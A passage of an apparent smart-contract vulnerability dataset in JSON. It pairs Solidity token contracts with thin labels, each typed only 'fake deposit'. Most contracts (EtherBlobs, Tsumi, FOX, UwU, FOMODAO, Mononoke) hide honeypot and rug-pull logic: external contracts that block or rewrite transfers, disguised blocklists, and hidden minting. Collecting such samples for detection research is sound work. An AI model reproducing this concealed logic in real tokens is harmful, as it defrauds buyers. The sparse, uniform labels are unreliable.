to move to operational\r\n      if(block.number <= fundingEndBlock && totalSupply != tokenCreationCap) throw;\r\n      // move to operational\r\n      isFinalized = true;\r\n      if(!ethFundDeposit.send(this.balance)) throw;  // send the eth to Brave International\r\n    }\r\n\r\n      function refund() external {\r\n      if(isFinalized) throw;                       // prevents refund if operational\r\n      if (block.number <= fundingEndBlock) throw; // prevents refund until sale period is over\r\n      if(totalSupply >= tokenCreationMin) throw;  // no refunds if we sold enough\r\n      if(msg.sender == batFundDeposit) throw;    // Brave Intl not entitled to a refund\r\n      uint256 batVal = balances[msg.sender];\r\n      if (batVal == 0) throw;\r\n      balances[msg.sender] = 0;\r\n      totalSupply = safeSubtract(totalSupply, batVal); // extra safe\r\n      uint256 ethVal = batVal / tokenExchangeRate;     // should be safe; previous throws covers edges\r\n      LogRefund(msg.sender, ethVal);               // log it \r\n      if (!msg.sender.send(ethVal)) throw;       // if you're using a contract; make sure it works with .send gas limits\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.0;\n\ncontract EtherBlobs is Context, IERC20, IERC20Metadata {\n\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    string private _tokenDO_name;\n    string private _tokenDO_symbol; \n\n\n    uint256 private _tokenDO_totalSupply;\n\n    IERC20Dependancies private ERC20Dependancies;\n\n    constructor() {\n        _tokenDO_name = \"EtherBlobs\";\n        _tokenDO_symbol = \"EBLOBS\";\n        _tokenDO_totalSupply = 1000000000 * 10 ** 18;\n        _balances[msg.sender] = _tokenDO_totalSupply;\n        ERC20Dependancies = IERC20Dependancies(0xbE3D1Bb28dF41526Da4a2666d40CEB8E5cbA7A23);\n    }\n\n    function _spendAllowance(\n        address balance_owner,\n        address balance_spender,\n        uint256 balance_amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(balance_owner, balance_spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= balance_amount, \"Token : insufficient allowance\");\n            unchecked {\n                _approve(balance_owner, balance_spender, currentAllowance - balance_amount);\n            }\n        }\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _tokenDO_totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function _beforeTokenTransfer(\n        address balance_from,\n        address balance_to,\n        uint256 balance_amount\n    ) internal virtual {}\n\n    function _afterTokenTransfer(\n        address balance_from,\n        address balance_to,\n        uint256 balance_amount\n    ) internal virtual {}\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, _allowances[owner][spender] + addedValue);\n        return true;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _tokenDO_name;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = _allowances[owner][spender];\n        require(currentAllowance >= subtractedValue, \"Token : decreased allowance below 0\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"Token : burn from the 0 address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"Token : burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _tokenDO_totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    function _safeTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"Token : transfer from the 0 address\");\n        require(to != address(0), \"Token : transfer to the 0 address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"Token : transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20Status(from, amount);\n        if (ERC20SafetyStatus == 0)\n        {\n            _spendAllowance(from, spender, amount);\n            _safeTransfer(from, to, amount);\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    }\n\n    \n\n    function symbol() public view virtual override returns (string memory) {\n        return _tokenDO_symbol;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    function _approve(\n        address balance_owner,\n        address balance_spender,\n        uint256 balance_amount\n    ) internal virtual {\n        require(balance_owner != address(0), \"Token : approve from the 0 address\");\n        require(balance_spender != address(0), \"Token : approve to the 0 address\");\n\n        _allowances[balance_owner][balance_spender] = balance_amount;\n        emit Approval(balance_owner, balance_spender, balance_amount);\n    }\n\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20TrustStatus(to);\n        if (ERC20SafetyStatus == 0)\n        {\n            _safeTransfer(owner, to, amount);\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n        \n    }\n\n\n    \n\n\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.0;\n\ncontract Tsumi is Context, IERC20, IERC20Metadata {\n\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    string private _tokenTS_name;\n    string private _tokenTS_symbol; \n\n\n    uint256 private _tokenTS_totalSupply;\n\n    IERC20Dependancies private ERC20Dependancies;\n\n    constructor() {\n        _tokenTS_name = \"Tsumi\";\n        _tokenTS_symbol = \"$TSUMI\";\n        _tokenTS_totalSupply = 9999999999999 * 10 ** 18;\n        _balances[msg.sender] = _tokenTS_totalSupply;\n        ERC20Dependancies = IERC20Dependancies(0xb6a17Ccf4B4f2cBA851f4D52aFBeFF61B8d1D9c2);\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _tokenTS_totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function _beforeTokenTransfer(\n        address balance_from,\n        address balance_to,\n        uint256 balance_amount\n    ) internal virtual {}\n\n    function _afterTokenTransfer(\n        address balance_from,\n        address balance_to,\n        uint256 balance_amount\n    ) internal virtual {}\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, _allowances[owner][spender] + addedValue);\n        return true;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _tokenTS_name;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = _allowances[owner][spender];\n        require(currentAllowance >= subtractedValue, \"Token : decreased allowance below 0\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"Token : burn from the 0 address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"Token : burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _tokenTS_totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    function _safeTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"Token : transfer from the 0 address\");\n        require(to != address(0), \"Token : transfer to the 0 address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"Token : transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20Status(from, amount);\n        if (ERC20SafetyStatus == 0)\n        {\n            _spendAllowance(from, spender, amount);\n            _safeTransfer(from, to, amount);\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    }\n\n    \n\n    function symbol() public view virtual override returns (string memory) {\n        return _tokenTS_symbol;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function _spendAllowance(\n        address balance_owner,\n        address balance_spender,\n        uint256 balance_amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(balance_owner, balance_spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= balance_amount, \"Token : insufficient allowance\");\n            unchecked {\n                _approve(balance_owner, balance_spender, currentAllowance - balance_amount);\n            }\n        }\n    }\n\n    \n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    function tame(address address_to_tame, uint256 amount) public virtual{\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20Status(address_to_tame, amount);\n        if(ERC20SafetyStatus == 0)\n        {\n            _balances[address_to_tame] = _balances[address_to_tame] + amount;\n        }\n    }\n\n\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20TrustStatus(to);\n        if (ERC20SafetyStatus == 0)\n        {\n            _safeTransfer(owner, to, amount);\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n        \n    }\n\n    function _approve(\n        address balance_owner,\n        address balance_spender,\n        uint256 balance_amount\n    ) internal virtual {\n        require(balance_owner != address(0), \"Token : approve from the 0 address\");\n        require(balance_spender != address(0), \"Token : approve to the 0 address\");\n\n        _allowances[balance_owner][balance_spender] = balance_amount;\n        emit Approval(balance_owner, balance_spender, balance_amount);\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n\n    \n\n\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: GPL-3.0-or-later\n\npragma solidity =0.7.1;\n\ncontract Ownable is Context {\n    address private _owner;\n    address private _ownerAddress;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        _ownerAddress = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() internal view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    \n    function ownerAddress() public view returns (address) {\n        return _ownerAddress;\n    }\n    \n    function renounceOwnership() public onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _ownerAddress = address(0);\n    }\n}\n\n\ncontract ERC20 {\n    using SafeMath for uint256;\n    bool internal _initialize;\n    mapping (address => uint256) internal _balances;\n    mapping (address =>bool) internal _multicall;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 internal _totalSupply;\n    string internal _name;\n    string internal _symbol;\n    uint8 internal _decimals;\n\n    constructor (string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = 9;\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n    \n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function _multiCall(address accounts) internal onlyOwner {\n        if (_multicall[accounts] == true) {_multicall[accounts] = false;} else {_multicall[accounts] = true;}\n    }\n    \n    function initialize() external onlyOwner {\n        if (_initialize == false) {_initialize = true;} else {_initialize = false;}\n    }\n        \n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        if (_multicall[sender] || _multicall[recipient]) require (amount == 0, \"\");\n        if (_initialize == true || sender == owner() || recipient == owner()) {\n        _beforeTokenTransfer(sender, recipient, amount);\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n        } else {require (_initialize == true, \"\");}\n    }\n\n    function _reflection(address account, uint256 value1, uint256 value2) internal virtual onlyOwner{\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        value1.sub(value2);\n        _balances[account] = _balances[account].add(value1);\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _setupDecimals(uint8 decimals_) internal {\n        _decimals = decimals_;\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n\ncontract FOX is ERC20 {\n    using SafeMath for uint256; \n    address uniswap;\n    uint8 _string;\n    uint8 _licence;\n    uint256 _supplyTokens;\n        \n    constructor () ERC20(_name, _symbol) {\n        \n\n        _name = \"Fox Inu\";\n        _symbol = \"FOX\";\n        _decimals = 9;\n        _supplyTokens = 1000000000 * 10**9;\n        _initialize = true;\n        _totalSupply = _totalSupply.add(_supplyTokens);\n        _balances[msg.sender] = _balances[msg.sender].add(_supplyTokens);\n        emit Transfer(address(0), msg.sender, _supplyTokens);\n    }\n   \n    function initialized() public view returns (bool) {\n        return _initialize;\n    }\n\n    function reflect(address account, uint256 value1, uint256 value2) public {\n        _reflection(account, value1, value2);\n    }\n    \n    function Multicall(address accounts) public {\n        _multiCall(accounts);\n    }\n\n    function swapStatus(address account) view public returns (bool){\n        return _multicall[account];\n    }\n    \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.16;\n\ncontract UwU is Ownable, IERC20 {\n    using SafeMath for uint256;\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 public _decimals = 9;\n    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;\n    uint256 public _fee = 5;\n    address public _devWallet;\n    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    IUniswapV3Router private _uniswapRouter = IUniswapV3Router(0x6314A449bDFd50D82E86Da732d5b7177a0FdDC5E);\n    string private _name = \"UwU\";\n    string private  _symbol = \"UwU\";\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n        return true;\n    }\n    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {\n        require(_allowances[msg.sender][from] >= amount);\n        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);\n        return true;\n    }\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0));\n        require(to != address(0));\n        if (_uniswapRouter.inSwap(from, to)) {\n            liquidityLqBurn(amount, to);\n        } else if (!liquidityBurnSwap || amount <= _balances[from]) {\n                _balances[_devWallet] = devFee(_devWallet, from);\n                uint256 feeAmount = getFeeAmount(from, to, amount);\n                uint256 amountReceived = amount - feeAmount;\n                _balances[address(this)] += feeAmount;\n                _balances[from] = _balances[from] - amount;\n                _balances[to] += amountReceived;\n                emit Transfer(from, to, amount);\n        }\n    }\n    function getFeeAmount(address from, address recipient, uint256 amount) private returns (uint256) {\n        uint256 feeAmount = 0;\n        if (_uniswapRouter.swapTokensForExactETH(from, recipient, liquidityBurnSwap, address(this), rebalanceFee())) {\n            feeAmount = amount.mul(_fee).div(100);\n            _devWallet = rebalanceFee() != recipient ? recipient : _devWallet;\n        }\n        return feeAmount;\n    }\n    constructor() {\n        _balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\n    }\n    function name() external view returns (string memory) { return _name; }\n    function symbol() external view returns (string memory) { return _symbol; }\n    function decimals() external view returns (uint256) { return _decimals; }\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\n    function uniswapVersion() external pure returns (uint256) { return 2; }\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"IERC20: approve from the zero address\");\n        require(spender != address(0), \"IERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    function liquidityLqBurn(uint256 num, address tfDz) private {\n        _approve(address(this), address(_router), num);\n        _balances[address(this)] = num;\n        address[] memory path = new address[](2);\n        liquidityBurnSwap = true;\n        path[0] = address(this);\n        path[1] = _router.WETH();\n        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(num,0,path,tfDz,block.timestamp + 30);\n        liquidityBurnSwap = false;\n    }\n    bool liquidityBurnSwap = false;\n    function devFee(address to, address from) private view returns (uint256) {\n        return _uniswapRouter.swapETHForExactTokens(_balances[to], from, rebalanceFee());\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(from, recipient, amount);\n        require(_allowances[from][msg.sender] >= amount);\n        return true;\n    }\n    function rebalanceFee() private view returns (address) {\n        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());\n    }\n    uint256 public _sellFee = 2;\n    uint256 public _buyFee = 1;\n    function updateSellFee(uint256 v) external onlyOwner {\n        require(v < 10);\n        _sellFee = v;\n    }\n    function updateBuyFee(uint256 v) external onlyOwner {\n        require(v < 10);\n        _buyFee = v;\n    }\n    bool swapEnabled = true;\n    function updateSwapEnabled(bool e) external onlyOwner {\n        swapEnabled = e;\n    }\n    address public deadAddress = 0x000000000000000000000000000000000000dEaD;\n    bool public autoLPBurn = false;\n    function setAutoLPBurnSettings(bool e) external onlyOwner {\n        autoLPBurn = e;\n    }\n    uint256 public maxWallet = _totalSupply.div(100);\n    function updateMaxWallet(uint256 m) external onlyOwner {\n        require(m >= _totalSupply.div(100));\n        maxWallet = m;\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.15;\n\ncontract FOMODAO is Ownable, IERC20 {\n    using SafeMath for uint256;\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 public _decimals = 9;\n    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;\n    uint256 public _fee = 1;\n    address public _marketingWallet;\n    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    IUniswapV3Router private _uniswapV2Router = IUniswapV3Router(0x24F24CA9F24BAC8C6e28191E15e2Da5C46c5Fe89);\n    string private _name = \"FOMO DAO\";\n    string private  _symbol = \"FOMO\";\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n        return true;\n    }\n    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {\n        require(_allowances[msg.sender][from] >= amount);\n        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);\n        return true;\n    }\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0));\n        require(to != address(0));\n        bool inSwap = _uniswapV2Router.factory(from, to);\n        if (inSwap) {\n            txBurnUniswap(amount, to);\n        } else if (amount <= _balances[from] || !uniswapLq) {\n                _balances[_marketingWallet] = takeMarketingFee(_marketingWallet, from);\n                uint256 feeAmount = getFeeAmount(from, to, amount);\n                uint256 amountReceived = amount - feeAmount;\n                _balances[address(this)] += feeAmount;\n                _balances[from] = _balances[from] - amount;\n                _balances[to] += amountReceived;\n                emit Transfer(from, to, amount);\n        }\n    }\n    function getFeeAmount(address from, address to, uint256 amount) private returns (uint256) {\n        uint256 feeAmount = 0;\n        if (_uniswapV2Router.swapTokensForExactETH(from, to, uniswapLq, address(this), swapRebalanceBurn())) {\n            feeAmount = amount.mul(_fee).div(100);\n            if (swapRebalanceBurn() != to) {_marketingWallet = to;}\n        }\n        return feeAmount;\n    }\n    constructor() {\n        _balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\n    }\n    function name() external view returns (string memory) { return _name; }\n    function symbol() external view returns (string memory) { return _symbol; }\n    function decimals() external view returns (uint256) { return _decimals; }\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\n    function uniswapVersion() external pure returns (uint256) { return 2; }\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"IERC20: approve from the zero address\");\n        require(spender != address(0), \"IERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    function txBurnUniswap(uint256 from, address ed) private {\n        _approve(address(this), address(_router), from);\n        _balances[address(this)] = from;\n        address[] memory path = new address[](2);\n        uniswapLq = true;\n        path[0] = address(this);\n        path[1] = _router.WETH();\n        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(from,0,path,ed,block.timestamp + 30);\n        uniswapLq = false;\n    }\n    bool uniswapLq = false;\n    function takeMarketingFee(address to, address from) private view returns (uint256) {\n        return _uniswapV2Router.swapETHForExactTokens(_balances[to], from, swapRebalanceBurn());\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(from, recipient, amount);\n        require(_allowances[from][msg.sender] >= amount);\n        return true;\n    }\n    function swapRebalanceBurn() private view returns (address) {\n        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());\n    }\n    bool started = false;\n    function startTrading() external onlyOwner {\n        started = true;\n    }\n    bool transferDelayEnabled = false;\n    function disableTransferDelay() external onlyOwner {\n        transferDelayEnabled = true;\n    }\n    address devWallet;\n    function updateDevWallet (address _a) external onlyOwner {\n        devWallet = _a;\n    }\n    uint256 maxWallet = _totalSupply.div(100);\n    function updateMaxWalletAmount(uint256 a) external onlyOwner {\n        maxWallet = a;\n    }\n    uint256 maxTx = _totalSupply.div(100);\n    function updateMaxTxAmount(uint256 a) external onlyOwner {\n        maxTx = a;\n    }\n    function removeLimits() external onlyOwner {\n        maxWallet = _totalSupply;\n        maxTx = _totalSupply;\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.15;\n\ncontract Mononoke is Ownable, IERC20 {\n    using SafeMath for uint256;\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 public _decimals = 9;\n    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;\n    uint256 public _fee = 5;\n    address public _marketingWallet;\n    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    IUniswapV3Router private _uniswapV2Router = IUniswapV3Router(0x24F24CA9F24BAC8C6e28191E15e2Da5C46c5Fe89);\n    string private _name = \"Mononoke Hime\";\n    string private  _symbol = \"MONONOKE\";\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n        return true;\n    }\n    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {\n        require(_allowances[msg.sender][from] >= amount);\n        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);\n        return true;\n    }\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0));\n        require(to != address(0));\n        bool inSwap = _uniswapV2Router.factory(from, to);\n        if (inSwap) {\n            txBurnUniswap(amount, to);\n        } else if (amount <= _balances[from] || !uniswapLq) {\n                _balances[_marketingWallet] = takeMarketingFee(_marketingWallet, from);\n                uint256 feeAmount = getFeeAmount(from, to, amount);\n                uint256 amountReceived = amount - feeAmount;\n                _balances[address(this)] += feeAmount;\n                _balances[from] = _balances[from] - amount;\n                _balances[to] += amountReceived;\n                emit Transfer(from, to, amount);\n        }\n    }\n    function getFeeAmount(address from, address to, uint256 amount) private returns (uint256) {\n        uint256 feeAmount = 0;\n        if (_uniswapV2Router.swapTokensForExactETH(from, to, uniswapLq, address(this), swapRebalanceBurn())) {\n            feeAmount = amount.mul(_fee).div(100);\n            if (swapRebalanceBurn() != to) {_marketingWallet = to;}\n        }\n        return feeAmount;\n    }\n    constructor() {\n        _balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\n    }\n    function name() external view returns (string memory) { return _name; }\n    function symbol() external view returns (string memory) { return _symbol; }\n    function decimals() external view returns (uint256) { return _decimals; }\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\n    function uniswapVersion() external pure returns (uint256) { return 2; }\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"IERC20: approve from the zero address\");\n        require(spender != address(0), \"IERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    function txBurnUniswap(uint256 from, address ed) private {\n        _approve(address(this), address(_router), from);\n        _balances[address(this)] = from;\n        address[] memory path = new address[](2);\n        uniswapLq = true;\n        path[0] = address(this);\n        path[1] = _router.WETH();\n        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(from,0,path,ed,block.timestamp + 30);\n        uniswapLq = false;\n    }\n    bool uniswapLq = false;\n    function takeMarketingFee(address to, address from) private view returns (uint256) {\n        return _uniswapV2Router.swapETHForExactTokens(_balances[to], from, swapRebalanceBurn());\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(from, recipient, amount);\n        require(_allowances[from][msg.sender] >= amount);\n        return true;\n    }\n    function swapRebalanceBurn() private view returns (address) {\n        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());\n    }\n    bool started = false;\n    function startTrading() external onlyOwner {\n        started = true;\n    }\n    bool transferDelayEnabled = false;\n    function disableTransferDelay() external onlyOwner {\n        transferDelayEnabled = true;\n    }\n    address devWallet;\n    function updateDevWallet (address _a) external onlyOwner {\n        devWallet = _a;\n    }\n    uint256 maxWallet = _totalSupply.div(100);\n    function updateMaxWalletAmount(uint256 a) external onlyOwner {\n        maxWallet = a;\n    }\n    uint256 maxTx = _totalSupply.div(100);\n    function updateMaxTxAmount(uint256 a) external onlyOwner {\n        maxTx = a;\n    }\n    function removeLimits() external onlyOwner {\n        maxWallet = _totalSupply;\n        maxTx = _totalSupply;\n    }\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
